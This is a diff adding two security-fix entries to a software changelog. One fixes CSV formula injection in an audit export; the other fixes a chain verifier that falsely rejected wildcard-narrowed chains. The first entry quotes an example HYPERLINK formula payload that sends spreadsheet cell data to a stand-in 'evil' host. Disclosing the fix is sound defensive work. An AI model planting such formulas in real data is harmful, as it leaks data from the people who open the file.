@@ -210,6 +210,47 @@ Until v0.1.0, the canonical reference is the most recent commit on
 
 ### Fixed
 
+- **CSV/spreadsheet formula injection (CWE-1236) in the audit-action export.**
+  `GET /api/v1/actions/export?format=csv` rendered rows through `esc()`
+  ([api/actions.rs](crates/proxy/src/api/actions.rs) `row_to_csv_line`), which
+  correctly defended CSV *structure* (quoting fields with `,` / `"` / newline
+  per RFC 4180) but did **not** neutralize formula triggers. Several exported
+  columns are attacker-influenced — the agent's request `path`, plus
+  `action` / `vendor` / `p_0` — and flow verbatim from `action_events` into the
+  CSV. A field beginning with `=`, `+`, `-`, `@`, or a leading tab/CR (e.g. a
+  requested path of `/drive/v3/files/=HYPERLINK("http://evil/?x="&A1,"go")`) is
+  evaluated as a formula when an operator opens the export in Excel / Google
+  Sheets / LibreOffice — and the export is the documented "point your SIEM at
+  this to backfill" surface that gets opened in a sheet. Fixed with the
+  OWASP-recommended defang: a field starting with a trigger character is
+  prefixed with a single quote and force-quoted (so the `'` survives a CSV
+  re-parse), rendering the cell as literal text. Benign and numeric/UUID fields
+  are unchanged. Pinned by
+  `row_to_csv_line_defangs_spreadsheet_formula_injection`.
+- **PCA chain verifier rejected every legitimately-narrowed (wildcard) chain as
+  a false monotonicity violation.** The PIC Identity invariant is
+  `child.ops ⊆ parent.ops`, and the upstream issuer (`provenance-core`
+  `Pca::contains_op` / `OperationSet::is_subset_of`) defines that subset
+  **wildcard-aware**: `drive:read:*` *contains* `drive:read:file/0Bw…`, and `*`
+  contains everything. The proxy's verifier
+  ([pic/verifier.rs](crates/proxy/src/pic/verifier.rs) `check_invariants`)
+  instead compared the op strings with plain equality
+  (`parent.ops.iter().any(|o| o == op)`). That is exactly the production chain
+  shape — a wildcard PCA_1 (the granted-scope ops from `narrowed_ops_for_pca1`)
+  narrowing to a concrete per-request PCA_2 (an adapter's
+  `required_ops`, e.g. `drive:read:file/<id>`) — so **every real narrowed
+  chain** verified as `intact: false` with a spurious `Monotonicity` error on
+  `GET /api/v1/pca/{id}/verify`, and falsely incremented the security-critical
+  `proxilion_pic_invariant_violations_total{kind="monotonicity"}` counter that
+  operators alert on (the confused-deputy signal). It was a false *positive* —
+  the verifier was *stricter* than the issuer, never looser, so no authority
+  was wrongly accepted — but it broke the chain-verification surface for the
+  documented common case and polluted a key alert. Fixed by checking subset
+  with `Pca::contains_op` (the issuer's own primitive), keeping the verifier in
+  lockstep with the mint. The bug was masked because the verifier's
+  `build_three_deep` fixture used *identical* ops at every hop; the new
+  `check_invariants_accepts_wildcard_narrowing_to_concrete_op` regression test
+  pins both a concrete-under-wildcard accept and a wrong-branch reject.
 - **Four operator-facing error `fix` hints pointed at non-existent or
   mislabelled CLI commands** — the `with_fix` strings on `OAuthError::UnknownClient`,
   `AppError::PolicyBlocked`, `AppError::Policy`/`OpsTemplate`, and the
